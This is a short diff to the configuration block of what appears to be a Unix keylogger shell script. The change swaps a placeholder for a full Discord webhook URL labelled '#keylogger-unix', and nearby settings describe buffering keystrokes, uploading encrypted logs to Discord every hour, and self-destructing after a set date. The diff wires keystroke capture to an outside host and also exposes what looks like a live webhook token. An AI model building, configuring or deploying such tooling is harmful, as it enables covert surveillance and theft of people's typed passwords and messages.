@@ -12,7 +12,7 @@
 ####################################################################################################
 
 # --- Configuration -----------------------------------------------------------
-DISCORD_WEBHOOK="REPLACE_ME"   # Discord webhook URL (leave REPLACE_ME to disable upload)
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1504980262889455859/5xIlNtBkZ4dvFA9AY-pfkAQR2E4MGTywMJgWPA9HivKORxQDYkSjeUJQQtzx2H5LDxf5"   # Discord webhook (#keylogger-unix) — from DISCORD_WEBHOOK_KEYLOGGER_UNIX in .env
 FLUSH_SECS=30                  # Seconds between flushing keystroke buffer to disk
 UPLOAD_SECS=3600               # Seconds between encrypted log uploads to Discord
 KILLSWITCH_DATE="2027-01-01"   # Script self-destructs after this date (YYYY-MM-DD)
